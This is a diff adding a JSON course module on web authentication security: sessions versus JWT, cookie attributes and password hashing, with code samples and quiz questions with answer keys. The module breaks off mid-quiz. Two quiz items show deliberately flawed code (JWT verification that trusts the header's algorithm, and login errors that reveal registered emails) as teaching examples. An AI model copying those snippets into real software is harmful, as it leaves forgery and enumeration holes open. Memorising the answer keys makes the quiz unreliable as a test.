@@ -1,0 +1,1836 @@
+{
+  "id": "auth-security",
+  "title": "Authentication and Security",
+  "area": "backend",
+  "order": 32,
+  "icon": "SEC",
+  "color": "#dc2626",
+  "description": "Authenticate and authorise users safely and defend web apps against real attacks: sessions vs JWT, cookies, password hashing, OAuth 2.0/OIDC, RBAC/ABAC, XSS, CSRF, CORS, injection, OWASP Top 10, TLS, security headers and secrets.",
+  "chapters": [
+    {
+      "id": "auth-security-01-sessions-jwt",
+      "title": "Authentication basics: sessions vs JWT",
+      "level": "beginner",
+      "summary": "How a server remembers who you are after login, and the real trade-offs between server-side sessions and JSON Web Tokens.",
+      "estMinutes": 30,
+      "lesson": [
+        {
+          "heading": "Authentication vs authorization",
+          "body": "**Authentication (authn)** answers \"who are you?\": verifying identity with a password, passkey, OTP or an identity provider. **Authorization (authz)** answers \"what are you allowed to do?\": checking permissions for a specific action on a specific resource.\n\nHTTP is stateless, so after login the server must give the client something to present on every later request. The two main approaches are a **session ID** that points to state stored on the server, and a **self-contained token** (usually a JWT) that carries the claims itself."
+        },
+        {
+          "heading": "Server-side sessions",
+          "body": "On login the server creates a session record (user ID, roles, expiry, CSRF secret) in a store such as Redis or the database, and sends the client a random, unguessable **session ID** in a cookie. Each request looks the ID up.\n\n- **Pros**: instant revocation (delete the record: logout, password change, ban), small cookie, server controls all data, easy to see active sessions.\n- **Cons**: a lookup per request (cheap with Redis), a shared store needed across instances, and cookies bring CSRF considerations.\n\nSecurity essentials: generate IDs with a CSPRNG (at least 128 bits of entropy), **regenerate the session ID on login** and privilege changes to prevent session fixation, set idle and absolute timeouts, and destroy the server record on logout.",
+          "code": {
+            "lang": "js",
+            "source": "import session from \"express-session\";\nimport { RedisStore } from \"connect-redis\";\n\napp.use(session({\n  store: new RedisStore({ client: redis }),\n  secret: process.env.SESSION_SECRET,\n  name: \"__Host-sid\",\n  resave: false,\n  saveUninitialized: false,\n  cookie: { httpOnly: true, secure: true, sameSite: \"lax\", maxAge: 8 * 60 * 60 * 1000 },\n}));\n\napp.post(\"/login\", async (req, res, next) => {\n  const user = await verifyCredentials(req.body.email, req.body.password);\n  if (!user) return res.status(401).json({ title: \"Invalid email or password\" });\n  req.session.regenerate((err) => {          // new ID: prevents session fixation\n    if (err) return next(err);\n    req.session.userId = user.id;\n    res.json({ ok: true });\n  });\n});"
+          }
+        },
+        {
+          "heading": "JSON Web Tokens",
+          "body": "A JWT is three base64url parts joined by dots: **header** (`alg`, `typ`, `kid`), **payload** (claims such as `sub`, `iss`, `aud`, `exp`, `iat`, plus custom ones) and **signature**. It is **signed, not encrypted**: anyone can decode and read the payload, so never put secrets or sensitive personal data in it. (JWE is the encrypted variant, rarely needed.)\n\nSigning algorithms: **HS256** uses one shared secret to sign and verify, so every verifier can also mint tokens. **RS256/ES256/EdDSA** sign with a private key and verify with a public key, typically published as a **JWKS** endpoint, which suits multiple services and third-party verification.\n\nVerification must check the signature with an **allowlist of algorithms** (never trust the `alg` header, the classic `alg: none` and RS/HS confusion attacks), plus `exp`, `nbf`, `iss` and `aud`.",
+          "code": {
+            "lang": "js",
+            "source": "import { SignJWT, jwtVerify } from \"jose\";\nconst secret = new TextEncoder().encode(process.env.JWT_SECRET); // >= 256 bits\n\nconst token = await new SignJWT({ role: \"member\" })\n  .setProtectedHeader({ alg: \"HS256\" })\n  .setSubject(\"user_42\")\n  .setIssuer(\"https://auth.example.com\")\n  .setAudience(\"orders-api\")\n  .setIssuedAt()\n  .setExpirationTime(\"15m\")\n  .sign(secret);\n\nconst { payload } = await jwtVerify(token, secret, {\n  algorithms: [\"HS256\"],                 // allowlist\n  issuer: \"https://auth.example.com\",\n  audience: \"orders-api\",\n});\nconsole.log(payload.sub); // user_42"
+          }
+        },
+        {
+          "heading": "The real trade-offs",
+          "body": "JWTs are **stateless**: any service with the key can verify them without a database lookup, which helps across microservices and third-party APIs. The cost is **revocation**: a stolen token is valid until it expires. Mitigations are short access-token lifetimes (5 to 15 minutes) plus refresh tokens that are stored server-side and can be revoked, or a denylist of token IDs (`jti`), which brings back state.\n\nPractical guidance:\n\n- For a classic web app with its own backend, **server-side sessions in HttpOnly cookies** are simple and secure.\n- For APIs consumed by many services, mobile apps or third parties, **short-lived JWT access tokens** (often issued by an OAuth/OIDC provider) plus revocable refresh tokens fit well.\n- Do not store tokens in `localStorage` if you can avoid it: any XSS can read it. An HttpOnly cookie cannot be read by JavaScript.\n- \"JWT vs session\" is partly a false choice: a JWT can be stored in a cookie, and a session ID can be sent in a header."
+        },
+        {
+          "heading": "Beyond passwords",
+          "body": "- **MFA**: TOTP apps, push approval, hardware keys. SMS OTP is better than nothing but vulnerable to SIM swapping.\n- **Passkeys (WebAuthn/FIDO2)**: public-key credentials bound to the site's origin, so they are phishing-resistant and nothing reusable is stored on the server. Now supported across major platforms and the preferred modern login.\n- **Magic links and email OTP**: passwordless, but security equals the email account's security; links must be single-use and short-lived."
+        }
+      ],
+      "keyPoints": [
+        "Authentication proves identity; authorization decides what that identity may do.",
+        "Sessions store state server-side and give the client a random ID; revocation is instant.",
+        "Regenerate the session ID at login to prevent session fixation.",
+        "JWTs are signed, not encrypted; anyone can read the payload.",
+        "Verify JWTs with an algorithm allowlist and check exp, iss and aud.",
+        "JWTs are hard to revoke; keep access tokens short-lived and refresh tokens revocable.",
+        "Passkeys are phishing-resistant and the strongest mainstream login method."
+      ],
+      "questions": [
+        {
+          "id": "auth-security-01-q01",
+          "type": "mcq",
+          "prompt": "A JWT payload contains the user's email and role. Who can read these values?",
+          "options": [
+            "Only the server holding the signing key",
+            "Anyone who has the token, by base64url-decoding it",
+            "Nobody, they are encrypted",
+            "Only the identity provider"
+          ],
+          "answer": 1,
+          "explanation": "A JWS-signed JWT is just base64url-encoded JSON. The signature prevents tampering, not reading. Use JWE or keep sensitive data out of tokens."
+        },
+        {
+          "id": "auth-security-01-q02",
+          "type": "mcq",
+          "prompt": "A user's account is compromised and you ban it. With 24-hour stateless JWTs and no denylist, when does the attacker lose access?",
+          "options": [
+            "Immediately",
+            "When the token expires, up to 24 hours later",
+            "At next login",
+            "Never"
+          ],
+          "answer": 1,
+          "explanation": "Stateless tokens are valid until exp because servers do not consult any state. This is why access tokens should be short-lived and refresh tokens revocable."
+        },
+        {
+          "id": "auth-security-01-q03",
+          "type": "mcq",
+          "prompt": "Why should the server regenerate the session ID after a successful login?",
+          "options": [
+            "To make cookies smaller",
+            "To prevent session fixation, where an attacker plants a known session ID before the victim logs in",
+            "Because Express requires it",
+            "To log out other devices"
+          ],
+          "answer": 1,
+          "explanation": "If the ID stayed the same, an attacker who set or knew the pre-login ID would share the authenticated session. A new ID at privilege change breaks that link."
+        },
+        {
+          "id": "auth-security-01-q04",
+          "type": "mcq",
+          "prompt": "Which JWT algorithm lets many services verify tokens without being able to create them?",
+          "options": [
+            "HS256",
+            "RS256 or ES256",
+            "none",
+            "SHA-256 without a key"
+          ],
+          "answer": 1,
+          "explanation": "Asymmetric algorithms sign with a private key held only by the issuer and verify with a public key (often from a JWKS URL). With HS256 every verifier holds the secret and could mint tokens."
+        },
+        {
+          "id": "auth-security-01-q05",
+          "type": "mcq",
+          "prompt": "What is the vulnerability in this verification code?",
+          "code": "const header = JSON.parse(base64urlDecode(token.split(\".\")[0]));\nconst payload = verify(token, key, { algorithms: [header.alg] });",
+          "options": [
+            "None",
+            "It trusts the alg from the token header; an attacker can use alg none or algorithm confusion",
+            "It checks expiration too strictly",
+            "It uses async code"
+          ],
+          "answer": 1,
+          "explanation": "Verification must pin the expected algorithms. Libraries that pick the algorithm from the token header have allowed unsigned tokens or HS256 tokens signed with the RSA public key as the HMAC secret."
+        },
+        {
+          "id": "auth-security-01-q06",
+          "type": "mcq",
+          "prompt": "Which statement about storing an access token in localStorage is accurate?",
+          "options": [
+            "It is immune to XSS",
+            "Any script running on the page, including injected XSS, can read and exfiltrate it",
+            "It is sent automatically with every request",
+            "It expires when the tab closes"
+          ],
+          "answer": 1,
+          "explanation": "localStorage is readable by any JavaScript on the origin. HttpOnly cookies cannot be read by scripts, which limits the damage XSS can do (although XSS can still make requests as the user)."
+        },
+        {
+          "id": "auth-security-01-q07",
+          "type": "truefalse",
+          "prompt": "Server-side sessions make it easy to log a user out of all devices immediately.",
+          "answer": true,
+          "explanation": "Deleting the session records for the user from the store invalidates every session ID at once. With stateless JWTs this requires extra state such as a token version per user."
+        },
+        {
+          "id": "auth-security-01-q08",
+          "type": "truefalse",
+          "prompt": "A JWT's signature guarantees the payload has not been modified, as long as verification uses the right key and algorithm.",
+          "answer": true,
+          "explanation": "The signature covers header and payload. Any change invalidates it. That integrity guarantee is the core value of a JWT."
+        },
+        {
+          "id": "auth-security-01-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which checks should a resource server perform when verifying a JWT access token?",
+          "options": [
+            "Signature with an allowlisted algorithm",
+            "exp (and nbf if present)",
+            "iss matches the expected issuer",
+            "aud includes this API",
+            "That the payload is encrypted"
+          ],
+          "answers": [
+            0,
+            1,
+            2,
+            3
+          ],
+          "explanation": "Signature, time validity, issuer and audience are all required. Access tokens are usually signed only, not encrypted."
+        },
+        {
+          "id": "auth-security-01-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: the JWT claim ___ holds the expiration time as a Unix timestamp.",
+          "accept": [
+            "exp"
+          ],
+          "explanation": "exp is a NumericDate (seconds since epoch). Verifiers must reject tokens past exp, usually with a small clock-skew allowance."
+        },
+        {
+          "id": "auth-security-01-q11",
+          "type": "interview",
+          "prompt": "Sessions or JWTs: how do you decide for a new application?",
+          "answer": "- Sessions: random ID in an HttpOnly cookie, state in Redis/DB. Instant revocation, small cookies, simple. Need a shared store and CSRF protection. Best for first-party web apps with a backend (including BFFs for SPAs).\n- JWTs: self-contained signed claims, verifiable anywhere with the key. Great for distributed services, third-party APIs and when an external IdP issues tokens. Hard to revoke, larger, easy to misuse (algorithm checks, long expiry, localStorage).\n- My default: sessions for browser apps (or a BFF that holds tokens server-side), short-lived JWT access tokens plus rotating refresh tokens for mobile and service-to-service, typically issued via OAuth 2.0/OIDC.\n- Whichever is used: secure cookie flags, short lifetimes, rotation, revocation story, and MFA/passkeys.",
+          "level": "beginner",
+          "top": true
+        },
+        {
+          "id": "auth-security-01-q12",
+          "type": "interview",
+          "prompt": "Explain the structure of a JWT and how verification works.",
+          "answer": "Header.payload.signature, each base64url-encoded. The header names the algorithm and key ID (kid). The payload has registered claims (iss, sub, aud, exp, nbf, iat, jti) and custom claims. The signature is computed over \"header.payload\" with HMAC (shared secret) or a private key (RSA, ECDSA, EdDSA).\nTo verify: pick the key (by kid from a trusted JWKS for asymmetric), recompute or check the signature using an allowlisted algorithm, then validate exp/nbf with small clock skew, iss and aud, and any required claims. Only then trust the claims. Use a maintained library (jose) rather than hand-rolled code.",
+          "level": "beginner"
+        },
+        {
+          "id": "auth-security-01-q13",
+          "type": "interview",
+          "prompt": "How do you handle logout and revocation when using JWTs?",
+          "answer": "- Keep access tokens short-lived (5 to 15 minutes) so revocation lag is bounded.\n- Refresh tokens are opaque, stored server-side (hashed), rotated on each use and revocable; logout deletes them, so no new access tokens are issued.\n- For immediate revocation needs (ban, password change), check a per-user token version or session ID claim against a fast store, or keep a denylist of jti values until their exp. This reintroduces a lookup, so apply it only where needed.\n- On the client, clear cookies. Logout at an OIDC provider may also require RP-initiated logout.",
+          "level": "intermediate",
+          "top": true
+        }
+      ],
+      "resources": [
+        {
+          "title": "OWASP Session Management Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
+        },
+        {
+          "title": "OWASP JSON Web Token Cheat Sheet (Java examples, general guidance)",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html"
+        },
+        {
+          "title": "RFC 8725: JSON Web Token Best Current Practices",
+          "url": "https://www.rfc-editor.org/rfc/rfc8725"
+        }
+      ]
+    },
+    {
+      "id": "auth-security-02-cookies",
+      "title": "Cookies done right: HttpOnly, Secure, SameSite and prefixes",
+      "level": "beginner",
+      "summary": "Every cookie attribute that matters for security, what it protects against, and how browsers treat cookies in 2026.",
+      "estMinutes": 25,
+      "lesson": [
+        {
+          "heading": "How cookies work",
+          "body": "The server sets a cookie with a `Set-Cookie` response header; the browser stores it and automatically attaches it in the `Cookie` header on later requests that match its domain, path and other rules. That automatic sending is what makes cookies convenient for sessions, and also what makes CSRF possible.\n\nA cookie without `Expires` or `Max-Age` is a **session cookie**, deleted when the browser session ends (browsers that restore sessions may keep it). With them it is **persistent**.",
+          "code": {
+            "lang": "http",
+            "source": "Set-Cookie: __Host-sid=8f2c1e...; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=28800"
+          }
+        },
+        {
+          "heading": "The security attributes",
+          "body": "- **HttpOnly**: JavaScript cannot read the cookie via `document.cookie`. Limits token theft through XSS. Always set it on session cookies.\n- **Secure**: only sent over HTTPS, so it cannot leak over plain HTTP on hostile networks.\n- **SameSite**: controls sending on cross-site requests. `Strict`: never sent on cross-site requests, even top-level link clicks. `Lax`: sent on top-level GET navigations from other sites but not on cross-site POSTs, iframes or fetches. `None`: always sent, **requires Secure**; needed for third-party embeds and some cross-site flows.\n- **Domain**: omit it to make a **host-only** cookie. Setting `Domain=example.com` shares it with every subdomain, so a compromised `blog.example.com` can read or overwrite it.\n- **Path**: limits which paths receive it. Not a security boundary.\n- **Max-Age / Expires**: lifetime. Keep session lifetimes bounded.\n\nChrome and Edge treat cookies without a SameSite attribute as `Lax` by default; Firefox and Safari differ in details, so always set SameSite explicitly."
+        },
+        {
+          "heading": "Cookie prefixes",
+          "body": "Prefixes are enforced by browsers and stop subdomains or insecure origins from planting look-alike cookies:\n\n- `__Secure-name`: must be set with `Secure` from an HTTPS origin.\n- `__Host-name`: must be `Secure`, must have `Path=/`, and must **not** have a `Domain` attribute. It is locked to the exact host. Best choice for session cookies.\n\nThese close \"cookie tossing\" attacks, where an attacker controlling a sibling subdomain sets a cookie that shadows yours."
+        },
+        {
+          "heading": "Same-site vs same-origin, and third-party cookies",
+          "body": "**Origin** = scheme + host + port (`https://app.example.com:443`). **Site** = scheme + registrable domain (`https://example.com`). So `app.example.com` and `api.example.com` are **cross-origin but same-site**: SameSite cookies flow between them, while CORS still applies to fetches. Registrable domains come from the Public Suffix List (`github.io` is a public suffix, so `a.github.io` and `b.github.io` are different sites).\n\nThird-party cookies (set in a cross-site context) are blocked by default in Safari and Firefox. Chrome kept them, after abandoning its 2024 plan to remove them, but restricts them in some modes. Design auth so it does not depend on third-party cookies: put the API on the same site as the app (e.g. `api.example.com` for `app.example.com`) or proxy it through the app's domain. **CHIPS** (`Partitioned` attribute) allows per-top-site cookies for legitimate embeds."
+        },
+        {
+          "heading": "Setting cookies in Express",
+          "body": "Use the framework helpers rather than writing headers by hand, sign cookies only when integrity without server state is needed, and remember to clear cookies with the same Path and Domain they were set with.",
+          "code": {
+            "lang": "js",
+            "source": "app.post(\"/login\", async (req, res) => {\n  // ...verify credentials, create session...\n  res.cookie(\"__Host-sid\", sessionId, {\n    httpOnly: true,\n    secure: true,\n    sameSite: \"lax\",\n    path: \"/\",\n    maxAge: 8 * 60 * 60 * 1000, // ms in Express\n  });\n  res.sendStatus(204);\n});\n\napp.post(\"/logout\", async (req, res) => {\n  await sessions.destroy(req.cookies[\"__Host-sid\"]);\n  res.clearCookie(\"__Host-sid\", { path: \"/\", secure: true, httpOnly: true, sameSite: \"lax\" });\n  res.sendStatus(204);\n});"
+          }
+        }
+      ],
+      "keyPoints": [
+        "HttpOnly blocks JavaScript access; Secure restricts to HTTPS.",
+        "SameSite=Lax sends cookies on top-level GET navigations only; Strict never cross-site; None requires Secure.",
+        "Omit Domain for host-only cookies; setting Domain shares the cookie with all subdomains.",
+        "__Host- cookies must be Secure, Path=/ and have no Domain: the safest choice for sessions.",
+        "Same-site is scheme + registrable domain; same-origin also requires the same host and port.",
+        "Do not rely on third-party cookies; keep the API same-site with the app.",
+        "Always set SameSite explicitly because browser defaults differ."
+      ],
+      "questions": [
+        {
+          "id": "auth-security-02-q01",
+          "type": "mcq",
+          "prompt": "Which attribute prevents document.cookie from exposing a session cookie to injected scripts?",
+          "options": [
+            "Secure",
+            "HttpOnly",
+            "SameSite=Strict",
+            "Path=/"
+          ],
+          "answer": 1,
+          "explanation": "HttpOnly hides the cookie from JavaScript APIs. Secure controls transport, SameSite controls cross-site sending, and Path only scopes URLs."
+        },
+        {
+          "id": "auth-security-02-q02",
+          "type": "mcq",
+          "prompt": "A cookie has SameSite=Lax. A malicious site auto-submits a cross-site POST form to your app. Is the cookie sent?",
+          "options": [
+            "Yes",
+            "No",
+            "Only in Chrome",
+            "Only if HttpOnly is set"
+          ],
+          "answer": 1,
+          "explanation": "Lax cookies are only sent on cross-site top-level navigations using safe methods like GET. A cross-site POST does not carry them, which blocks classic form-based CSRF."
+        },
+        {
+          "id": "auth-security-02-q03",
+          "type": "mcq",
+          "prompt": "What happens if you set SameSite=None without Secure in modern browsers?",
+          "options": [
+            "The cookie works normally",
+            "The cookie is rejected",
+            "It becomes Strict",
+            "It becomes HttpOnly"
+          ],
+          "answer": 1,
+          "explanation": "Browsers require Secure for SameSite=None cookies and reject ones that lack it."
+        },
+        {
+          "id": "auth-security-02-q04",
+          "type": "mcq",
+          "prompt": "Which cookie is accepted by the browser?",
+          "options": [
+            "Set-Cookie: __Host-sid=1; Secure; Path=/; Domain=example.com",
+            "Set-Cookie: __Host-sid=1; Secure; Path=/",
+            "Set-Cookie: __Host-sid=1; Path=/",
+            "Set-Cookie: __Host-sid=1; Secure; Path=/app"
+          ],
+          "answer": 1,
+          "explanation": "__Host- requires Secure, Path=/ and no Domain attribute. Each of the other options violates one of those rules."
+        },
+        {
+          "id": "auth-security-02-q05",
+          "type": "mcq",
+          "prompt": "Are https://app.example.com and https://api.example.com the same site?",
+          "options": [
+            "No, different origins means different sites",
+            "Yes, they share the registrable domain example.com, though they are different origins",
+            "Only if they use the same port",
+            "Only with CORS enabled"
+          ],
+          "answer": 1,
+          "explanation": "Site is defined by scheme plus registrable domain. They are cross-origin (different hosts), so CORS applies to fetches, but same-site, so SameSite cookies are sent."
+        },
+        {
+          "id": "auth-security-02-q06",
+          "type": "mcq",
+          "prompt": "Your session cookie sets Domain=example.com. What is the risk?",
+          "options": [
+            "None",
+            "Every subdomain, including less trusted ones, receives and can overwrite the cookie",
+            "The cookie is sent over HTTP",
+            "The cookie becomes third-party"
+          ],
+          "answer": 1,
+          "explanation": "Domain widens scope to all subdomains. A vulnerable marketing subdomain could steal or toss cookies. Host-only cookies (no Domain) or __Host- prefix avoid this."
+        },
+        {
+          "id": "auth-security-02-q07",
+          "type": "truefalse",
+          "prompt": "A cookie without Max-Age or Expires is a session cookie that is removed when the browser session ends.",
+          "answer": true,
+          "explanation": "Without a lifetime, browsers keep the cookie only for the browser session, although session restore features can keep it alive longer."
+        },
+        {
+          "id": "auth-security-02-q08",
+          "type": "truefalse",
+          "prompt": "SameSite cookies remove the need for any other CSRF consideration in all cases.",
+          "answer": false,
+          "explanation": "SameSite is strong defence in depth, but Lax still allows top-level GETs (so GETs must not change state), same-site subdomains can still attack, and older or misconfigured clients exist. Sensitive actions may still warrant CSRF tokens or origin checks."
+        },
+        {
+          "id": "auth-security-02-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which attributes should a typical session cookie for app.example.com have?",
+          "options": [
+            "HttpOnly",
+            "Secure",
+            "SameSite=Lax or Strict",
+            "Domain=.example.com",
+            "A bounded Max-Age"
+          ],
+          "answers": [
+            0,
+            1,
+            2,
+            4
+          ],
+          "explanation": "HttpOnly, Secure, an explicit SameSite and a bounded lifetime are standard. Leaving Domain unset keeps the cookie host-only."
+        },
+        {
+          "id": "auth-security-02-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: the cookie prefix ___ requires Secure, Path=/ and no Domain attribute.",
+          "accept": [
+            "__Host-",
+            "__Host"
+          ],
+          "explanation": "__Host- cookies are pinned to a single host over HTTPS, preventing subdomain cookie tossing."
+        },
+        {
+          "id": "auth-security-02-q11",
+          "type": "interview",
+          "prompt": "What cookie attributes would you set for a session cookie and why?",
+          "answer": "- HttpOnly: JS cannot read it, so XSS cannot simply steal the session.\n- Secure: never sent over plain HTTP.\n- SameSite=Lax (or Strict for high-security apps): blocks most cross-site request forgery; None only if a legitimate cross-site flow needs it, with Secure.\n- No Domain (host-only) and the __Host- prefix with Path=/: prevents subdomains from reading or overwriting it.\n- A bounded Max-Age plus server-side idle and absolute timeouts; the value is a random, high-entropy ID, not user data.",
+          "level": "beginner",
+          "top": true
+        },
+        {
+          "id": "auth-security-02-q12",
+          "type": "interview",
+          "prompt": "Explain the difference between same-origin and same-site and why it matters for auth.",
+          "answer": "Origin is scheme, host and port; site is scheme plus registrable domain (eTLD+1 from the Public Suffix List). app.example.com and api.example.com are cross-origin but same-site.\nSameSite cookie rules use site: cookies flow between app and api subdomains, so a SPA on app can call api with cookies (with CORS configured and credentials included). CORS and the same-origin policy use origin.\nSecurity consequence: any subdomain of your site counts as same-site, so a compromised or user-content subdomain can perform same-site requests that SameSite does not block. Host user content on a separate registrable domain (e.g. usercontent.example-cdn.com).",
+          "level": "intermediate"
+        },
+        {
+          "id": "auth-security-02-q13",
+          "type": "interview",
+          "prompt": "How should a SPA on app.example.com authenticate against an API, given third-party cookie restrictions?",
+          "answer": "- Keep the API same-site (api.example.com) or behind the same origin via a reverse proxy (/api), so session cookies are first-party and SameSite=Lax works.\n- Prefer the BFF pattern: the SPA talks to its own backend with an HttpOnly session cookie; the BFF holds OAuth tokens server-side and calls downstream APIs.\n- Avoid storing tokens in localStorage. If tokens must live in the browser, keep them in memory with short lifetimes and refresh via an HttpOnly refresh cookie.\n- Configure CORS with explicit origins and credentials only if cross-origin calls are needed, and add CSRF protection for state-changing endpoints.",
+          "level": "intermediate"
+        }
+      ],
+      "resources": [
+        {
+          "title": "MDN: Using HTTP cookies",
+          "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies"
+        },
+        {
+          "title": "MDN: Set-Cookie header",
+          "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie"
+        },
+        {
+          "title": "web.dev: SameSite cookies explained",
+          "url": "https://web.dev/articles/samesite-cookies-explained"
+        }
+      ]
+    },
+    {
+      "id": "auth-security-03-passwords",
+      "title": "Password storage, brute force and account security",
+      "level": "beginner",
+      "summary": "Hash passwords with the right algorithm, stop credential stuffing and brute force, and build safe reset flows.",
+      "estMinutes": 30,
+      "lesson": [
+        {
+          "heading": "Hashing, not encryption",
+          "body": "Passwords must be stored with a **one-way, slow, salted** hash. Encryption is reversible, so anyone with the key (or a stolen key) recovers every password. Fast hashes like SHA-256 or MD5 are wrong too: GPUs compute billions per second, so leaked hashes are cracked quickly.\n\nA **salt** is a unique random value per password, stored alongside the hash. It makes identical passwords hash differently and defeats precomputed rainbow tables. Modern algorithms generate and embed the salt for you. An optional **pepper** is a secret added to all hashes and kept outside the database (e.g. in a secrets manager or HSM), so a DB-only leak is not enough to crack."
+        },
+        {
+          "heading": "Which algorithm",
+          "body": "OWASP's current recommendations, in order of preference:\n\n- **Argon2id**: memory-hard winner of the Password Hashing Competition. Minimum configuration: 19 MiB memory, 2 iterations, parallelism 1.\n- **scrypt**: memory-hard; e.g. N=2^17, r=8, p=1. Available in Node core as `crypto.scrypt`.\n- **bcrypt**: widely supported, use a work factor of at least 10 (12 is common). It only uses the first **72 bytes** of input, so very long passphrases are truncated.\n- **PBKDF2**: when FIPS compliance is required, with HMAC-SHA-256 and 600,000 iterations.\n\nTune cost so a hash takes a few hundred milliseconds on your servers, and store the parameters with the hash (the encoded string does this) so you can raise them later and **rehash on next login**. Password hashing is CPU-intensive: run it off the event loop (the native libraries use the libuv thread pool) and rate limit login so attackers cannot use it to exhaust CPU.",
+          "code": {
+            "lang": "js",
+            "source": "import argon2 from \"argon2\";\n\nexport async function hashPassword(plain) {\n  // encoded result includes algorithm, params and salt: $argon2id$v=19$m=19456,t=2,p=1$...\n  return argon2.hash(plain, { type: argon2.argon2id, memoryCost: 19456, timeCost: 2, parallelism: 1 });\n}\n\nexport async function verifyPassword(stored, plain) {\n  const ok = await argon2.verify(stored, plain);\n  if (ok && argon2.needsRehash(stored, { memoryCost: 19456, timeCost: 2 })) {\n    // upgrade the hash transparently with current parameters\n  }\n  return ok;\n}"
+          }
+        },
+        {
+          "heading": "Password policy (NIST style)",
+          "body": "Modern guidance (NIST SP 800-63B, OWASP) has moved away from complexity rules:\n\n- Require length (at least 8 characters, 15 when the password is the only factor under NIST's 2025 revision) and allow at least 64 characters, including spaces and Unicode.\n- **No composition rules** (forced symbols and digits) and **no periodic forced rotation**; change passwords only on evidence of compromise.\n- **Check against breached password lists** (e.g. the Have I Been Pwned k-anonymity range API) and reject common passwords.\n- Allow paste and password managers. Offer and encourage MFA or passkeys."
+        },
+        {
+          "heading": "Brute force and credential stuffing",
+          "body": "**Brute force** guesses many passwords for one account. **Password spraying** tries a few common passwords against many accounts. **Credential stuffing** replays username/password pairs leaked from other sites, and is the most common attack in practice.\n\nLayered defences:\n\n- Rate limit by IP **and** by account identifier, with progressive delays.\n- Avoid hard lockouts after N failures (attackers can lock out real users); prefer temporary throttling, CAPTCHAs or step-up challenges after suspicious attempts.\n- **MFA** stops most stuffing even with a correct password.\n- Bot detection and anomaly signals (new device, impossible travel) at the edge or WAF.\n- Generic error messages: \"Invalid email or password\", and comparable response times for unknown users (hash a dummy password) to avoid **user enumeration**. The same applies to signup and reset flows.",
+          "code": {
+            "lang": "js",
+            "source": "app.post(\"/login\", loginLimiter, async (req, res) => {\n  const { email, password } = LoginSchema.parse(req.body);\n  const user = await users.findByEmail(email);\n  // verify against a dummy hash when the user does not exist to equalise timing\n  const ok = await verifyPassword(user?.passwordHash ?? DUMMY_HASH, password);\n  if (!user || !ok) {\n    await recordFailure(email, req.ip);\n    return res.status(401).json({ title: \"Invalid email or password\" });\n  }\n  // ...MFA step if enabled, then create session\n});"
+          }
+        },
+        {
+          "heading": "Password reset flows",
+          "body": "- Generate a random token (at least 128 bits, `crypto.randomBytes(32)`), store only its **hash** with an expiry (e.g. 30 to 60 minutes), and make it **single-use**.\n- Send it by email in a link; respond identically whether or not the email exists.\n- Do not build reset links from the request's `Host` header (host header poisoning can point links to an attacker's domain); use a configured base URL.\n- After reset: invalidate all existing sessions and refresh tokens, notify the user, and do not auto-login without MFA if MFA is enabled.\n- Security questions are weak and should not be used."
+        }
+      ],
+      "keyPoints": [
+        "Store passwords with a slow, salted, one-way hash, never encryption or fast hashes.",
+        "Prefer Argon2id (19 MiB, t=2, p=1 minimum), then scrypt, bcrypt (cost 10+, 72-byte limit), PBKDF2 for FIPS.",
+        "Store parameters with the hash and rehash on login when you raise the cost.",
+        "No composition rules or forced rotation; enforce length and block breached passwords.",
+        "Credential stuffing is the main threat: rate limit per IP and per account, add MFA and bot detection.",
+        "Use generic errors and equal timing to avoid user enumeration.",
+        "Reset tokens: random, hashed at rest, short-lived, single-use; revoke sessions after reset."
+      ],
+      "questions": [
+        {
+          "id": "auth-security-03-q01",
+          "type": "mcq",
+          "prompt": "Which is the most appropriate way to store user passwords in 2026?",
+          "options": [
+            "AES-256 encryption",
+            "SHA-256 with a global salt",
+            "Argon2id with a per-password salt",
+            "Base64 encoding"
+          ],
+          "answer": 2,
+          "explanation": "Argon2id is slow and memory-hard, making GPU cracking expensive, and uses a unique salt per hash. Encryption is reversible, SHA-256 is far too fast, and base64 is just encoding."
+        },
+        {
+          "id": "auth-security-03-q02",
+          "type": "mcq",
+          "prompt": "What does a per-user salt protect against?",
+          "options": [
+            "Phishing",
+            "Precomputed rainbow tables and identical passwords sharing the same hash",
+            "Slow login times",
+            "SQL injection"
+          ],
+          "answer": 1,
+          "explanation": "Unique salts force attackers to crack each hash separately and make identical passwords produce different hashes. They do not slow down a single guess; that is the job of the cost factor."
+        },
+        {
+          "id": "auth-security-03-q03",
+          "type": "mcq",
+          "prompt": "What is a known limitation of bcrypt?",
+          "options": [
+            "It has no salt",
+            "It only uses the first 72 bytes of the password",
+            "It cannot be tuned",
+            "It is reversible"
+          ],
+          "answer": 1,
+          "explanation": "bcrypt ignores input beyond 72 bytes. Long passphrases are truncated, which also matters if you concatenate other data before hashing. Argon2id has no such limit."
+        },
+        {
+          "id": "auth-security-03-q04",
+          "type": "mcq",
+          "prompt": "Attackers try millions of email/password pairs leaked from other websites against your login. What is this called?",
+          "options": [
+            "Brute force",
+            "Credential stuffing",
+            "Session fixation",
+            "Clickjacking"
+          ],
+          "answer": 1,
+          "explanation": "Credential stuffing exploits password reuse. Defences include rate limiting, bot detection, breached password checks and MFA."
+        },
+        {
+          "id": "auth-security-03-q05",
+          "type": "mcq",
+          "prompt": "What is wrong with this login response design?",
+          "code": "if (!user) return res.status(404).json({ error: \"No account with that email\" });\nif (!ok)   return res.status(401).json({ error: \"Wrong password\" });",
+          "options": [
+            "Nothing",
+            "It reveals which emails are registered (user enumeration)",
+            "The status codes are too generic",
+            "It is too slow"
+          ],
+          "answer": 1,
+          "explanation": "Different messages let attackers build a list of valid accounts for targeted attacks. Return a generic message and similar timing for both cases."
+        },
+        {
+          "id": "auth-security-03-q06",
+          "type": "mcq",
+          "prompt": "How should a password reset token be stored?",
+          "options": [
+            "In plain text so it can be emailed again",
+            "As a hash with an expiry, marked used after one use",
+            "Inside a long-lived JWT with no server record",
+            "In localStorage"
+          ],
+          "answer": 1,
+          "explanation": "If the database leaks, hashed tokens cannot be used. Expiry and single use limit the window of abuse. A stateless JWT could not be revoked after use."
+        },
+        {
+          "id": "auth-security-03-q07",
